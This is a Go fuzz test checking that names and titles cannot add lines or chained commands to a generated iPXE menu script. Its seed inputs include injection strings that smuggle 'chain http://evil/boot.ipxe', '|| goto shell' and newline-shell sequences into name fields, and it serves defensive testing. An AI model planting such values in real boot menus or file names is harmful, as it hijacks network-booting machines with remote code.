package menu

import (
	"strings"
	"testing"

	"github.com/ghazichaieb/gola-bootlace/internal/ipxesafe"
)

// chainWords counts the words of the script that iPXE takes as the end of a command (a separate && || or ;), splitting a line the way iPXE does: at a space, a tab, a vertical tab,
// a form feed or a carriage return.
func chainWords(script string) int {
	n := 0
	for _, line := range strings.Split(script, "\n") {
		for _, w := range strings.FieldsFunc(line, func(r rune) bool { return r == ' ' || (r >= 0x09 && r <= 0x0d) }) {
			if ipxesafe.Terminator(w) {
				n++
			}
		}
	}
	return n
}

// FuzzNamesCannotAddLinesToTheScript: names and titles come from files in the library and from the ISOs themselves, and the menu is an iPXE script in which every line is a
// command. Whatever a name holds, the script must have exactly the lines it has for a harmless name, in the text and in the picture and BIOS shapes, and it must not have more
// commands chained to each other than that script has (iPXE ends a command at a separate && || or ;, which a file name can hold).
func FuzzNamesCannotAddLinesToTheScript(f *testing.F) {
	f.Add("Ubuntu 24.04", "Ubuntu", "live", "5.8 GB")
	f.Add("x\nshell\n", "t\r\nchain http://evil/", "k\x00", "s")
	f.Add("a || goto shell", "$ {x} ;", "&& reboot", "|")
	f.Add("x && chain http://evil/boot.ipxe || shell ; y", "a\v&&\fb", "k ; k", "s")
	f.Fuzz(func(t *testing.T, name, title, kind, size string) {
		build := func(n, ti, k, s string, o Options) string {
			entries := []Entry{{Name: n, Title: ti, Kind: k, Size: s, Commands: []string{"echo go", "boot"}}, {Name: "b", Commands: []string{"boot"}}, {Name: "c", Commands: []string{"boot"}}}
			return ScriptWith(n, entries, o)
		}
		for _, o := range []Options{{}, {Ascii: true, Pages: 2, Page: 1, Next: "http://x/menu?page=2"}, {Picture: "http://x/bg.png", Width: 1024, Height: 768, Prev: "http://x/menu"}} {
			got, want := build(name, title, kind, size, o), build("a", "A", "live", "1 GB", o)
			if g, w := strings.Count(got, "\n"), strings.Count(want, "\n"); g != w {
				t.Fatalf("%q %q %q %q: %d lines instead of %d (options %+v)", name, title, kind, size, g, w, o)
			}
			if g, w := chainWords(got), chainWords(want); g != w {
				t.Fatalf("%q %q %q %q: %d chaining words instead of %d (options %+v)", name, title, kind, size, g, w, o)
			}
		}
	})
}
